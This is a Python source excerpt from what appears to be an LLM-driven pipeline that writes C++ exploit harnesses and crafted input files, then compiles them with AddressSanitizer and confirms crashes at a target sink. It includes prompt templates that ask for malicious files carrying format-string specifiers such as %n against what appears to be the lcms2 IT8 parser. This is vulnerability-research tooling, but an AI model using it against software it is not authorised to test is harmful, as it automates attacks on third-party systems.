        if so.backward_reasons and any("compile" in r.lower() for r in so.backward_reasons[-3:]):
            if so.header_file:
                api = self.env.exec(f"grep -n 'EXPORT\\|extern.*(' {so.header_file} 2>/dev/null | head -20", timeout=5)
                if api.stdout.strip(): sections.append(f"\n=== FULL API ===\n{api.stdout.strip()[:1500]}")

        # ── Call chain discovery ─────────────────────────────────────
        # After 2+ WRITE failures where the LLM wrote stubs/mocks or
        # failed to call the target function, automatically discover
        # HOW to reach the sink through the real codebase.
        stub_fail_count = sum(1 for r in so.backward_reasons
                              if any(k in r for k in ("mock/stub", "does not CALL",
                                                       "NEVER CALLED", "skeleton")))
        if stub_fail_count >= 2 and not so.call_chain:
            logger.info("WRITE: %d stub/no-call failures — running call chain discovery",
                        stub_fail_count)
            so.call_chain = self._discover_call_chain()
            turn_log["call_chain_discovered"] = bool(so.call_chain)

        if so.call_chain:
            sections.append(f"\n=== CALL CHAIN: HOW TO REACH {so.sink_function} ===\n"
                            f"The sink function is INTERNAL — you cannot call it directly.\n"
                            f"Here is how the real codebase reaches it:\n"
                            f"{so.call_chain[:3000]}\n\n"
                            f"⚠️ You MUST call the PUBLIC API function shown above (marked with ✅).\n"
                            f"Do NOT write stubs or mocks. Call the REAL function that eventually reaches {so.sink_function}.")

        if so.reference_harness: sections.append(f"\n=== REFERENCE FUZZER ===\n{so.reference_harness}")

        # Deep vulnerability analysis from `deeptrace reason`
        if so.reasoning_analysis:
            sections.append(f"\n=== VULNERABILITY ANALYSIS (from security researcher) ===\n"
                            f"{so.reasoning_analysis[:2500]}")

        # Strategic reflection (produced after 3+ failed attempts)
        if so.reflection_insight:
            sections.append(f"\n=== ⚠️ STRATEGIC ANALYSIS (your previous approach was WRONG) ===\n"
                            f"After {so.pipeline_attempts} failed attempts, here is what you need to do differently:\n\n"
                            f"{so.reflection_insight[:2500]}\n\n"
                            f"⚠️ Follow the strategy above. Do NOT repeat the previous approach.")

            # ── Detect file-loading pattern and inject concrete template ──
            # When reflection identifies file-based input, the LLM must create
            # BOTH the harness AND the malicious input file in the same turn.
            import re as _re
            file_load_keywords = ["LoadFromFile", "LoadFromMem", "file parsing",
                                  "load a file", "load a crafted", "crafted file",
                                  "from file", "from mem", ".it8", ".icc", ".cgats",
                                  "INPUT_TYPE: file", "malicious file"]
            needs_file_input = any(kw.lower() in so.reflection_insight.lower()
                                   for kw in file_load_keywords)
            if needs_file_input and self.env.is_running:
                # Find the file-loading API in the header
                load_funcs = []
                if so.header_declarations:
                    for func in _re.findall(r'\b(\w+(?:Load|Read|Parse|Open)\w*)\s*\(', so.header_declarations):
                        load_funcs.append(func)
                if not load_funcs and so.header_file:
                    grep_r = self.env.exec(
                        f"grep -oE '\\w+(Load|FromFile|FromMem|Parse)\\w*' /src/{so.header_file} 2>/dev/null "
                        f"| sort -u | head -10",
                        timeout=5)
                    if grep_r.stdout.strip():
                        load_funcs = [f.strip() for f in grep_r.stdout.strip().split("\n")]

                # Read parser source to understand file format
                parser_code = ""
                if so.data_source_info:
                    write_locs = _re.findall(r'(/src/[^:]+):(\d+)', so.data_source_info)
                    for wfile, wline in write_locs[:1]:
                        ln = int(wline)
                        ctx_r = self.env.exec(
                            f"sed -n '{max(1, ln - 40)},{ln + 20}p' {wfile} 2>/dev/null",
                            timeout=5)
                        if ctx_r.stdout.strip():
                            parser_code = ctx_r.stdout.strip()[:2000]

                # Find sample files of the right format
                sample_file_content = ""
                sample_file_path = ""
                ext = so.input_ext if so.input_ext != ".bin" else ".it8"
                samples_r = self.env.exec(
                    f"find /src -name '*{ext}' -o -name '*.cgats' 2>/dev/null | head -5",
                    timeout=10)
                if samples_r.stdout.strip():
                    sample_file_path = samples_r.stdout.strip().split("\n")[0].strip()
                    content_r = self.env.exec(f"cat {sample_file_path} 2>/dev/null | head -30", timeout=5)
                    if content_r.stdout.strip():
                        sample_file_content = content_r.stdout.strip()[:800]

                load_fn = load_funcs[0] if load_funcs else "cmsIT8LoadFromFile"
                ct = so.callable_target or so.sink_function
                hdr = so.header_file.split('/')[-1] if so.header_file else 'lcms2.h'
                inp_ext = so.input_ext if so.input_ext != ".bin" else ext

                template = f"""
=== ⚠️⚠️⚠️ MANDATORY: CREATE TWO FILES ⚠️⚠️⚠️ ===

Your previous {so.pipeline_attempts} attempts used the WRONG approach (SetPropertyStr / direct API calls).
The vulnerability requires a MALICIOUS INPUT FILE loaded through the parser.

You MUST create EXACTLY TWO files in your response:

FILE 1: The harness (loads the malicious file)
<write_file path="/work/harness.cpp">
#include "{hdr}"
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {{
    if (argc != 2) {{ fprintf(stderr, "Usage: %s <input>\\n", argv[0]); return 1; }}
    cmsHANDLE h = {load_fn}(NULL, argv[1]);
    if (!h) {{ fprintf(stderr, "Failed to load\\n"); return 1; }}
    {ct}(h, "TEST", 3.14159);
    cmsIT8Free(h);
    return 0;
}}
</write_file>

FILE 2: The malicious input file (CRITICAL — this is what triggers the vulnerability)
<write_file path="/work/input{inp_ext}">
... your crafted content here — must contain the malicious payload ...
</write_file>

⚠️ The input file content must set the vulnerable field through the PARSER.
⚠️ Look at the PARSER CODE below to find the exact keyword/format needed.
⚠️ The harness loads this file via {load_fn}, then calls {ct} to trigger the bug.
"""
                sections.append(template)

                if parser_code:
                    sections.append(f"\n=== PARSER CODE (shows how the vulnerable field gets set during file loading) ===\n"
                                    f"```c\n{parser_code}\n```\n"
                                    f"⚠️ Find the KEYWORD in this parser that sets the vulnerable struct member.\n"
                                    f"Your malicious input file must contain that keyword with a dangerous value.")

                if sample_file_content:
                    sections.append(f"\n=== SAMPLE {ext.upper()} FILE (copy this, change ONLY the vulnerable field) ===\n"
                                    f"File: {sample_file_path}\n"
                                    f"```\n{sample_file_content}\n```\n"
                                    f"⚠️ Copy this file structure. Change ONLY the line that sets the vulnerable field "
                                    f"to contain format specifiers like %s%s%s%s or %n.")

                if load_funcs:
                    sections.append(f"\n=== AVAILABLE LOAD FUNCTIONS ===\n" +
                                    "\n".join(f"  - {f}" for f in load_funcs[:5]))

        sections.append(f"\nTRACE:\n{so.trace_text}")
        if so.backward_reasons:
            sections.append("\n=== PREVIOUS FAILURES ===")
            for r in so.backward_reasons[-3:]: sections.append(f"  - {r}")

        # Cross-cycle memory
        if so.last_run_feedback:
            sections.append(f"\n=== LAST RUN RESULT ===\n{so.last_run_feedback}")
        if so.last_harness_source and so.pipeline_attempts > 0:
            sections.append(f"\n=== YOUR PREVIOUS HARNESS (do NOT repeat the same approach) ===\n"
                            f"```cpp\n{so.last_harness_source[:2000]}\n```")

        # Other trace paths (cross-reference for alternative approaches)
        if self._all_traces and len(self._all_traces) > 1 and so.pipeline_attempts >= 2:
            sections.append("\n=== OTHER TRACE PATHS (alternative approaches) ===")
            for ti, tp in enumerate(self._all_traces[:5]):
                if tp is self.trace:
                    continue
                entry_name = tp.steps[0].node_name if tp.steps else "?"
                sink_name = tp.steps[-1].node_name if tp.steps else "?"
                entry_loc = f"{tp.steps[0].location.file}:{tp.steps[0].location.line}" if tp.steps and tp.steps[0].location else "?"
                tags = ", ".join(tp.vulnerability_tags[:3]) if tp.vulnerability_tags else "?"
                sections.append(f"  Path {ti}: {entry_loc} ({entry_name}) → {sink_name}  [{tags}]")

        for _, res in self._exchanges[-2:]: sections.append(f"\n--- Previous ---\n{res[:1000]}")

        input_file_hint = (
            "\n8. If the vulnerability requires a crafted INPUT FILE (not just code), "
            "use <write_file path=\"/work/input.EXT\">...content...</write_file> to create it. "
            "The INPUT_REFLECTION stage will also create and test input files automatically."
        )

        sections.append(f"""
REQUIREMENTS:
1. Use EXACTLY: {include_line or 'the header from API HEADER above'}
2. Do NOT include internal source files — use the PUBLIC header
3. Do NOT write stubs, mocks, or fake implementations — call REAL library functions
4. Read input from argv[1]
5. {'Call the PUBLIC API function from the CALL CHAIN above' if so.call_chain else f'Call {so.callable_target or so.entry_function or so.sink_function} to process input'}
6. The execution path must reach {so.sink_function}{f' (via {so.callable_target})' if so.callable_target != so.sink_function else ''}
7. If unsure about a function, use <shell>grep</shell> to find it in the codebase{input_file_hint}

YOUR FIRST ACTION MUST BE: <write_file path="/work/harness.cpp"> — write the complete harness NOW.""")

        # Adjust system prompt urgency based on how many times we've explored without writing
        if no_write_count >= 2:
            system = ("You write C/C++ exploit harnesses. "
                      "OUTPUT A <write_file path=\"/work/harness.cpp\"> BLOCK IMMEDIATELY. "
                      "Do NOT run any <shell> commands first. Write the file NOW.\n" + _TOOLS_BLOCK)
        else:
            system = "You write C/C++ exploit harnesses.\n" + _TOOLS_BLOCK

        resp = self._call_llm(self.llm_b, system, "\n".join(sections))
        turn_log["llm_response"] = resp[:4000]
        actions = parse_actions(resp)

        # Check if the LLM actually wrote harness.cpp (via write_file OR shell heredoc)
        wrote_harness = any(
            (a.kind == "write_file" and "harness" in a.path) or
            (a.kind == "shell" and "/work/harness" in a.content and
             any(w in a.content for w in (">", "cat", "tee", "echo")))
            for a in actions
        )

        results = self._exec_actions(actions[:self.config.max_actions_per_turn], result) if actions else ""
        self._exchanges.append((resp[:1500], results[:1500])); self._exchanges = self._exchanges[-2:]

        # If LLM explored but didn't write — give targeted feedback, don't burn a write_attempt
        if not wrote_harness:
            harness_exists = self.env.exec("test -f /work/harness.cpp && echo y", timeout=3).stdout.strip() == "y"
            if not harness_exists:
                so.backward_reasons.append("explored but did NOT write harness.cpp")
                turn_log["gate"] = "NO_WRITE: LLM explored but didn't create file"
                logger.warning("WRITE: LLM ran %d actions but no write_file for harness.cpp", len(actions))

                # Don't count this as a write_attempt — the LLM didn't actually attempt to write
                self._write_attempts -= 1

                # After 3+ exploration-only turns, pre-gather the info the LLM keeps searching for
                # and inject it directly so it has no excuse not to write
                if no_write_count >= 2:
                    # Gather the API the LLM was probably looking for
                    api_dump = ""
                    if so.header_file:
                        r = self.env.exec(f"head -100 {so.header_file} 2>/dev/null", timeout=5)
                        api_dump = (r.stdout or "")[:2000]

                    self._exchanges = [("(system)",
                        f"⚠️ You have spent {no_write_count+1} turns running shell commands "
                        f"without writing /work/harness.cpp. This is NOT acceptable.\n\n"
                        f"Here is the API you keep searching for:\n"
                        f"```c\n{api_dump}\n```\n\n"
                        f"NOW WRITE THE FILE. Your next response MUST start with:\n"
                        f"<write_file path=\"/work/harness.cpp\">")]
                else:
                    self._exchanges = [("(system)",
                        f"⚠️ You ran {len(actions)} commands but did NOT write /work/harness.cpp.\n"
                        f"You MUST output <write_file path=\"/work/harness.cpp\"> with the complete harness.\n"
                        f"Do NOT explore more — write the file NOW using what you already know.")]
                return

        # Normal validation
        check = self._validate_harness(); turn_log["gate"] = check
        if check == "PASS":
            self.stage = Stage.COMPILE; self._exchanges.clear(); so.compile_errors.clear()
        elif self._write_attempts >= self.config.max_write_attempts:
            self._decide_recovery("write_exhausted", check)
        else:
            # Track specific failure types in backward_reasons so call chain
            # discovery can detect the "LLM keeps writing stubs" pattern
            if any(k in check for k in ("mock/stub", "does not CALL", "skeleton")):
                so.backward_reasons.append(check[:100])
            self._exchanges.append(("(system)", f"⚠️ Harness invalid: {check}\nFix with <write_file>."))

    def _validate_harness(self) -> str:
        if self.env.exec("test -f /work/harness.cpp && echo y", timeout=5).stdout.strip() != "y":
            return "FAIL: /work/harness.cpp does not exist"
        content = self.env.exec("cat /work/harness.cpp 2>/dev/null", timeout=5).stdout or ""
        if "#include" not in content: return "FAIL: missing #include"
        if "main" not in content and "LLVMFuzzerTestOneInput" not in content: return "FAIL: missing main()"
        if any(m in content.lower() for m in ["mock","stub","fake","// mock","// stub","// fake"]):
            return "FAIL: contains mock/stub — use REAL library"

        # Strip comments and string literals before checking for function calls.
        stripped = re.sub(r'//.*$', '', content, flags=re.MULTILINE)
        stripped = re.sub(r'/\*.*?\*/', '', stripped, flags=re.DOTALL)
        stripped = re.sub(r'"[^"]*"', '""', stripped)

        # Use callable_target (not sink_function) for the "must call" check.
        # sink_function might be a variable (dest_scan) that can never appear as func().
        target = self.so.callable_target or self.so.sink_function
        sink = self.so.sink_function

        # Check for re-implementation (still against sink if it's a function)
        if target and content.count(target) >= 2:
            for line in content.split("\n"):
                s = line.strip()
                if target in s and (s.startswith("static") or (s.endswith("{") and "=" not in s)):
                    return f"FAIL: re-implements {target}"

        # Build list of acceptable functions to call.
        # callable_target is the PRIMARY check; trace functions and entry are secondary.
        trace_funcs = []
        for s in self.trace.steps:
            if s.node_name:
                for p in s.node_name.split("|"):
                    p = p.strip()
                    if p and len(p) > 3: trace_funcs.append(p)
        entry_parts = [p.strip() for p in self.so.entry_function.split("|")
                       if len(p.strip()) > 3] if self.so.entry_function else []

        # Look for "functionName(" pattern in comment-stripped code
        all_funcs = list(dict.fromkeys(
            ([target] if target else []) + entry_parts + trace_funcs))
        has_call = False
        for func in all_funcs:
            if func and re.search(rf'\b{re.escape(func)}\s*\(', stripped):
                has_call = True
                break

        if not has_call:
            # Give specific guidance based on whether target differs from sink
            if target != sink:
                return (f"FAIL: harness does not CALL any target function. "
                        f"'{sink}' is a variable, not a function. "
                        f"You must call {target}() which internally uses {sink}.")
            return (f"FAIL: harness does not CALL any target function. "
                    f"You must call {target}(). "
                    f"Having the name in a comment or string is not enough.")

        # Skeleton detection
        code_lines = [l.strip() for l in stripped.split("\n")
                      if l.strip() and not l.strip().startswith("//") and not l.strip().startswith("#")]
        in_main = False; meaningful_lines = 0
        for line in code_lines:
            if "main" in line and "(" in line: in_main = True; continue
            if in_main:
                if line in ("{", "}", "return 0;", "return 1;", "return EXIT_FAILURE;"):
                    continue
                meaningful_lines += 1
        if meaningful_lines < 3:
            return ("FAIL: harness is a skeleton with only "
                    f"{meaningful_lines} meaningful lines. "
                    f"You must actually call library functions to process the input.")

        return "PASS"

    # =================================================================
    # STAGE 3: COMPILE (Hard Reset + Dynamic API Hinting)
    # =================================================================

    def _run_compile_turn(self, result, turn_log):
        so = self.so; self._compile_attempts += 1
        for retry in range(3):
            flags = so.include_flags or "-I/src"
            cmd = f"g++ -fsanitize=address -g -std=c++17 {flags} /work/harness.cpp -c -o /work/harness.o 2>&1"
            r = self.env.exec(cmd, timeout=120)
            output = self._smart_truncate(cmd, r.exit_code, r.output or "")
            if self.env.exec("test -f /work/harness.o && echo y", timeout=5).stdout.strip() == "y":
                turn_log["gate"] = f"COMPILE PASS (retry {retry})"
                self.env.exec("rm -f /work/harness", timeout=3)
                self.stage = Stage.LINK; self._exchanges.clear(); return
            turn_log[f"compile_output_{retry}"] = output[:1000]
            so.compile_errors.append(output[:500])
            fixed = False
            if "No such file or directory" in output and ".h" in output:
                if sum(1 for e in so.compile_errors[-3:] if e == so.compile_errors[-1]) <= 1:
                    fixed = self._auto_fix_include(output, turn_log)
            if not fixed: break

        if self._compile_attempts >= self.config.max_compile_attempts:
            review = self._ask_reviewer(f"Compilation failed {self._compile_attempts}x.\n{output[:500]}")
            turn_log["review"] = review
            # Always escalate after max attempts — don't loop with reviewer
            self._decide_recovery("compile_failed", output[:200])
            return

        # ── Hard Reset: detect hallucination loop ────────────────────
        if len(so.compile_errors) >= 3 and so.compile_errors[-1] == so.compile_errors[-2] == so.compile_errors[-3]:
            self._decide_recovery("compile_stuck", so.compile_errors[-1][:200])
            turn_log["reason"] = "Hard Reset — same error 3x"
            return

        # ── Dynamic API Hinting ──────────────────────────────────────
        header_hint = ""
        if "No such file or directory" in output and ".h" in output and so.header_file:
            header_hint = f"\n\nHINT: Correct header is {so.header_file.split('/')[-1]}."

        api_hint = ""
        if any(k in output for k in ("not declared","was not declared","too few arguments","invalid conversion","no matching function")):
            for line in output.split("\n"):
                if "note:" in line and ("declared here" in line or "candidate:" in line or "EXPORT" in line):
                    api_hint += f"\n  {line.strip()}"
            efn = self._clean_entry_fn()
            api_hint = f"\n\n⚠️ API MISMATCH:" + api_hint + f"\nTarget entry: {efn}"
            if so.header_file and "not declared" in output:
                api_hint += f"\nStop guessing! Search: <shell>grep -iE 'alloc|create|new|init|load' {so.header_file or '/src/ --include=*.h'}</shell>"

        current = self.env.read_file("/work/harness.cpp")
        prompt = (f"COMPILE ERROR:\n{output[:1500]}{header_hint}{api_hint}\n\n"
                  f"CURRENT HARNESS:\n```cpp\n{current}\n```\n\n"
                  f"Fix ONLY this error. Output COMPLETE file in <write_file path=\"/work/harness.cpp\">. "
                  f"Do NOT strip library calls or main().")
        resp = self._call_llm(self.llm_b, "Fix the compile error. Full file in <write_file>.", prompt)
        turn_log["llm_response"] = resp[:4000]
        actions = parse_actions(resp)
        if actions: self._exec_actions(actions[:self.config.max_actions_per_turn], result)

        # Re-validate: did the LLM strip all library calls to "fix" the error?
        recheck = self._validate_harness()
        if recheck != "PASS":
            turn_log["revalidation_failed"] = recheck
            self._decide_recovery("harness_stripped", output[:300])
            return

        # Immediately try recompiling in the same turn — don't waste a turn
        flags = so.include_flags or "-I/src"
        recomp = self.env.exec(
            f"g++ -fsanitize=address -g -std=c++17 {flags} "
            f"/work/harness.cpp -c -o /work/harness.o 2>&1", timeout=120)
        if self.env.exec("test -f /work/harness.o && echo y", timeout=5).stdout.strip() == "y":
            turn_log["gate"] = "COMPILE PASS (after LLM fix, same turn)"
            self.env.exec("rm -f /work/harness", timeout=3)
            self.stage = Stage.LINK; self._exchanges.clear()

    def _auto_fix_include(self, output, turn_log) -> bool:
        so = self.so
        missing = re.search(r"fatal error:\s*['\"]?([^\s:'\"]+\.h)", output)
        if not missing: return False
        inc_path = missing.group(1); hdr_name = inc_path.split("/")[-1]
        find_r = self.env.exec(f"find /src -path '*/{inc_path}' 2>/dev/null | head -5", timeout=10)
        found = [p.strip() for p in find_r.stdout.strip().split("\n") if p.strip()]
        if not found:
            find_r = self.env.exec(f"find /src -name '{hdr_name}' 2>/dev/null | head -10", timeout=10)
            found = [p.strip() for p in find_r.stdout.strip().split("\n") if p.strip()]
        if not found: return False
        fixed = False
        for fp in found:
            nd = fp[:-len(inc_path)-1] if fp.endswith("/"+inc_path) else fp.rsplit("/",1)[0]
            nf = f"-I{nd or '/'}"
            if nf not in so.include_flags:
                so.include_flags = f"{so.include_flags} {nf}".strip(); fixed = True
            else:
                fd = fp.rsplit("/",1)[0]
                md = f"/work/inc_fix/{'/'.join(inc_path.split('/')[:-1])}" if "/" in inc_path else "/work/inc_fix"
                self.env.exec(f"mkdir -p {md}", timeout=3)
                self.env.exec(f"cp {fd}/*.h {md}/ 2>/dev/null", timeout=5)
                if "-I/work/inc_fix" not in so.include_flags:
                    so.include_flags = f"-I/work/inc_fix {so.include_flags}".strip()
                fixed = True
        return fixed

    # =================================================================
    # STAGES 4-9: PIPELINE
    # =================================================================

    def _run_pipeline(self, result, turn_log):
        if self.stage == Stage.LINK:
            turn_log["pipeline_stage"] = "LINK"
            ok = self.env.exec("test -x /work/harness && echo y", timeout=5).stdout.strip() == "y"
            first_link_error = ""
            if not ok:
                so = self.so; link_r = None
                for strategy, objs_expr in [
                    ("archive", so.prebuild_archive),
                    ("archive_force", so.prebuild_archive),
                    ("objects", " ".join(so.prebuild_objects) if so.prebuild_objects else ""),
                    ("glob", self.env.exec("ls /work/build/*.o /work/*.o 2>/dev/null", timeout=5).stdout.replace("\n"," ").strip()),
                ]:
                    if not objs_expr: continue
                    force = "-Wl,--unresolved-symbols=ignore-in-object-files " if "force" in strategy or strategy in ("objects","glob") else ""
                    link_r = self.env.exec(f"g++ -fsanitize=address -g /work/harness.o {objs_expr} -o /work/harness {force}-lpthread -ldl -lm 2>&1", timeout=120)
                    ok = self.env.exec("test -x /work/harness && echo y", timeout=5).stdout.strip() == "y"
                    if not first_link_error and link_r.output:
                        first_link_error = link_r.output  # save the most informative error
                    if ok: turn_log["link_method"] = strategy; break
            if ok:
                self.stage = Stage.RUN
                src = self.env.exec("cat /work/harness.cpp 2>/dev/null", timeout=5)
                self.so.last_harness_source = (src.stdout or "")[:3000]
            else:
                # Extract undefined symbols for actionable feedback
                err = first_link_error or (link_r.output if link_r else "no objects")
                undef_syms = re.findall(r"undefined reference to [`'](\w+)'", err)
                undef_hint = ""
                if undef_syms:
                    undef_hint = (f"\nUndefined symbols: {', '.join(set(undef_syms[:10]))}\n"
                                  f"These functions are NOT in the library archive. "
                                  f"Use only functions from the public header.")
                self._decide_recovery("link_failed", (err[:200] + undef_hint)[:500])
            return

        if self.stage == Stage.RUN:
            turn_log["pipeline_stage"] = "RUN"
            inp = self._find_input_file()
            run_out = self._run_harness(inp); self.so.run_output = run_out
            crash = self._classify_crash(run_out); self.so.crash_type = crash
            turn_log["crash_type"] = crash
            if crash in ("target_sink","same_file"): self.so.crash_file = inp; self.stage = Stage.VERIFY
            elif crash == "segfault_no_asan":
                # Real crash but no ASAN — still worth verifying
                self.so.crash_file = inp; self.stage = Stage.VERIFY
            elif crash == "init_crash": self._decide_recovery("init_crash", run_out, "RUN")
            elif crash == "harness_bug": self._decide_recovery("harness_bug", run_out[:500], "RUN")
            else:
                # Clean run — no crash. Decide next step based on what we know.
                self.so.last_run_feedback = f"CLEAN EXIT (no crash). Output:\n{run_out[:800]}"

                # SHORTCUT: If we already know the vulnerability requires a crafted
                # input file (from REFLECT or data_source_info), skip SWEEP entirely
                # and go straight to INPUT_REFLECTION.  SWEEP tries repo test files
                # which won't have the malicious payload — wasting a turn.
                knows_file_input = (
                    self.so.input_format == "file" or
                    self.so.sink_confirmed_reachable or  # previously confirmed
                    (self.so.reflection_insight and any(
                        kw in self.so.reflection_insight.lower()
                        for kw in ["loadfromfile", "loadfrommem", "crafted file",
                                    "malicious file", "input file", ".it8", ".icc"]))
                )
                if knows_file_input:
                    logger.info("DECISION: clean exit + file-based vuln → INPUT_REFLECTION (skip SWEEP)")
                    self.stage = Stage.INPUT_REFLECTION
                else:
                    self.stage = Stage.SWEEP
            return

        if self.stage == Stage.SWEEP:
            turn_log["pipeline_stage"] = "SWEEP"
            cf = self._sweep_inputs()
            if cf:
                rc = self.env.exec(f"ASAN_OPTIONS=detect_leaks=0 timeout 10 /work/harness {cf} 2>&1", timeout=15)
                rc_crash = self._classify_crash(rc.output or "")
                if rc_crash == "init_crash":
                    self._decide_recovery("init_crash", rc.output or "", "SWEEP"); return
                self.so.crash_file = cf; self.stage = Stage.VERIFY
            else:
                # No crash with any input — check if the sink is even reachable
                # before wasting turns crafting input for a broken harness
                sink_reachable = self._check_sink_reachable()
                turn_log["sink_reachable"] = sink_reachable
                if sink_reachable:
                    # Harness reaches the callable target — problem is the INPUT
                    self.so.sink_confirmed_reachable = True
                    ct = self.so.callable_target or self.so.sink_function
                    self.so.last_run_feedback = (
                        (self.so.last_run_feedback or "") +
                        f"\n\n✅ GDB confirmed: {ct} IS reachable. "
                        f"The harness is CORRECT. Only the input needs to trigger the vulnerability.")
                    self.stage = Stage.INPUT_REFLECTION
                else:
                    # Harness never reaches the callable target.
                    # BUT: if the harness loads a file, maybe the test inputs were
                    # just the wrong format. A proper crafted input might make the
                    # sink reachable. Try INPUT_REFLECTION once before rewriting.
                    self.so.sink_confirmed_reachable = False
                    ct = self.so.callable_target or self.so.sink_function

                    harness_loads_file = (self.so.last_harness_source and any(
                        kw in self.so.last_harness_source
                        for kw in ["LoadFromFile", "LoadFromMem", "fopen", "argv[1]"]))
                    already_tried_input = any("input reflection" in r.lower()
                                               for r in self.so.backward_reasons[-5:])

                    if harness_loads_file and not already_tried_input:
                        logger.info("DECISION: sink not reached but harness loads files → INPUT_REFLECTION first")
                        self.so.last_run_feedback = (
                            (self.so.last_run_feedback or "") +
                            f"\n\n❌ GDB: {ct} not reached with test files. "
                            f"But the harness loads files — the test files may be wrong format. "
                            f"Trying crafted input before rewriting harness.")
                        self.so.backward_reasons.append("input reflection: sink not reached, trying crafted input")
                        self.stage = Stage.INPUT_REFLECTION
                    else:
                        self.so.last_run_feedback = (
                            (self.so.last_run_feedback or "") +
                            f"\n\n❌ GDB confirmed: {ct} is NEVER CALLED. "
                            f"The harness does NOT exercise the vulnerable code path. Rewrite it.")
                        self._decide_recovery("no_crash",
                            f"sink {self.so.sink_function} never reached (GDB confirmed)", "SWEEP")
            return

        if self.stage == Stage.INPUT_REFLECTION:
            turn_log["pipeline_stage"] = "INPUT_REFLECTION"
            # Clean old crafted files to prevent testing stale payloads
            self.env.exec("rm -f /work/crafted_input* 2>/dev/null", timeout=3)
            crafted = self._run_input_reflection(turn_log)
            if crafted:
                self.so.crash_file = crafted
                self.stage = Stage.RUN_CRAFTED
            else:
                self._decide_recovery("no_crash", "input reflection failed to produce crash", "INPUT_REFLECTION")
            return

        if self.stage == Stage.RUN_CRAFTED:
            turn_log["pipeline_stage"] = "RUN_CRAFTED"
            run_out = self._run_harness(self.so.crash_file)
            crash = self._classify_crash(run_out); turn_log["crash_type"] = crash
            if crash in ("target_sink","same_file","segfault_no_asan"):
                self.stage = Stage.VERIFY
            elif crash == "init_crash": self._decide_recovery("init_crash", run_out, "RUN_CRAFTED")
            elif crash == "wrong_location":
                self.so.last_run_feedback = f"WRONG LOCATION crash (not at sink). Output:\n{run_out[:800]}"
                self._decide_recovery("wrong_location", run_out[:200], "RUN_CRAFTED")
            else:
                self.so.last_run_feedback = f"CLEAN EXIT with crafted input. Output:\n{run_out[:800]}"
                craft_retries = sum(1 for r in self.so.backward_reasons
                                    if "craft retry" in r)
                if craft_retries < 2:
                    self.so.backward_reasons.append(f"craft retry {craft_retries+1}")
                    self.stage = Stage.INPUT_REFLECTION
                else:
                    self._decide_recovery("no_crash",
                                          "clean exit after multiple crafted inputs",
                                          "RUN_CRAFTED")
            return

        if self.stage == Stage.VERIFY:
            turn_log["pipeline_stage"] = "VERIFY"
            vr = self._run_verification("/work/harness", self.so.crash_file)
            result.verification = vr
            turn_log["verified"] = vr.confirmed
            turn_log["sink_reached"] = getattr(vr, "sink_reached", False)
            turn_log["sink_in_stack"] = getattr(vr, "sink_in_crash_stack", False)

            if vr.confirmed:
                # confirmed = crash in library + sink on stack (GDB or ASAN)
                self._finalize_success(result, self.so.crash_file,
                                       f"verified: {vr.summary[:100]}")
                self.stage = Stage.SUCCESS
            elif vr.asan_crash and vr.asan_in_library:
                # Crash in library but sink NOT on stack — wrong code path
                loc = getattr(vr, "asan_location", "") or ""
                ft = ("init_crash"
                      if any(k in loc for k in ("Alloc", "Init", "Create", "Malloc"))
                      else "wrong_location")
                self._decide_recovery(ft, loc, "VERIFY")
            elif vr.harness_crashed_itself:
                self._decide_recovery("harness_bug",
                                      f"crash at {getattr(vr, 'asan_location', '?')}",
                                      "VERIFY")
            elif vr.sink_reached and not vr.asan_crash:
                # Sink reached but no crash — input doesn't trigger, try CRAFT
                self.so.sink_confirmed_reachable = True
                self.so.last_run_feedback = (
                    f"✅ VERIFY confirmed sink {self.so.sink_function} is reached, "
                    f"but no crash. Need better input payload.")
                self._decide_recovery("no_crash",
                                      "sink reached but no crash", "VERIFY")
            else:
                self._decide_recovery("verify_failed",
                                      vr.summary[:200] if vr else "", "VERIFY")
            return

    # =================================================================
    # Success finalization
    # =================================================================

    def _finalize_success(self, result, crash_file, reason=""):
        result.success = True; result.harness_path = "/work/harness"
        result.harness_source_path = "/work/harness.cpp"
        result.input_path = crash_file; result.final_reason = reason
        ls_r = self.env.exec("ls /work/input.* /work/crafted_input* /work/crash_input 2>/dev/null", timeout=5)
        if ls_r.stdout.strip(): result.input_files = [f.strip() for f in ls_r.stdout.strip().split("\n") if f.strip()]
        result.run_poc_script = self._gen_poc()
        result.vulnerability_report = self._gen_report(self.so.run_output or "", crash_file)

    def _gen_poc(self) -> str:
        so = self.so; a = so.prebuild_archive or "/work/build/libtarget.a"
        return f"#!/bin/bash\nset -e\ng++ -fsanitize=address -g -std=c++17 {so.include_flags} /work/harness.cpp -c -o /work/harness.o\ng++ -fsanitize=address -g /work/harness.o {a} -Wl,--unresolved-symbols=ignore-in-object-files -o /work/harness -lpthread -ldl -lm\nASAN_OPTIONS=detect_leaks=0 /work/harness {so.crash_file or '/work/input.dat'} 2>&1 || true\n"

    def _gen_report(self, crash_output, crash_file) -> str:
        so = self.so; asan_sum = ""; asan_trace = ""
        if "AddressSanitizer" in crash_output:
            for l in crash_output.split("\n"):
                if "ERROR:" in l and "AddressSanitizer" in l: asan_sum = l.strip()
                if "SUMMARY:" in l: asan_sum = l.strip()
                if l.strip().startswith("#"): asan_trace += f"    {l.strip()}\n"
        return f"# Vulnerability Report\n\n**Sink**: `{so.sink_function}` @ `{so.sink_file}`\n**Entry**: `{so.entry_function}` @ `{so.entry_file}`\n**Type**: {', '.join(so.vuln_tags) or 'unknown'}\n\n## ASAN\n```\n{asan_sum}\n```\n\n## Trace\n```\n{asan_trace.strip()}\n```\n\n## Source Trace\n```\n{so.trace_text}\n```\n"

    # =================================================================
    # Call chain discovery — finds how to reach the sink from public API
    # =================================================================

    def _run_reflect(self):
        """Strategic reflection: after repeated failures, analyze what's wrong.

        This is triggered after 3 failed WRITE→RUN cycles. Instead of
        continuing the same approach, we give the LLM ALL accumulated
        context and ask it to produce a NEW strategy.

        The output is stored in so.reflection_insight and injected into
        all subsequent WRITE and CRAFT prompts.
        """
        so = self.so
        logger.info("REFLECT: analyzing %d failed attempts to find new strategy", so.pipeline_attempts)

        sections = []
        sections.append("You are a security researcher analyzing FAILED exploit attempts.")
        sections.append("Your job is to figure out WHY the previous attempts failed and "
                        "produce a CONCRETE new strategy for triggering the vulnerability.")
        sections.append("")

        # ── What we're targeting ───────────────────────────────────
        sections.append(f"=== TARGET ===")
        sections.append(f"Sink: {so.sink_function} in {so.sink_file}")
        sections.append(f"Vulnerability: {', '.join(so.vuln_tags) or 'unknown'}")
        sections.append(f"Callable target: {so.callable_target}")
        sections.append(f"Summary: {so.vuln_summary}")

        # ── The sink source code ───────────────────────────────────
        if so.sink_source:
